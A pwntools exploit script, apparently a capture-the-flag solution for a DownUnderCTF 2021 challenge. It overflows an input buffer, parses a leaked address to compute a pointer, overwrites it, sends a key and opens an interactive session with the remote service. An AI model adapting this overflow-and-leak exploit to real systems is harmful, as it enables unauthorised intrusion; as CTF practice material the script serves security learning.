from pwn import *

bin_sh_diff = 0x559388bd40a3 - 0x559388bd4024

io = remote("pwn-2021.duc.tf", 31907)
io.recv()

payload = b"A" * 31
io.sendline(payload)
io.recv()

io.sendline(b"2")
leak = u64(io.recv().split(b"\n")[1].ljust(8, b"\x00"))
bin_sh = leak + bin_sh_diff

io.sendline(b"1")
io.recv()

payload = b"A" * 32
payload += p64(bin_sh)
io.sendline(payload)
io.recv()

io.sendline(b"1337")
io.recv()

# first four bytes of /bin/sh
key = 0x464c457f
io.sendline(str(key).encode())
io.interactive()
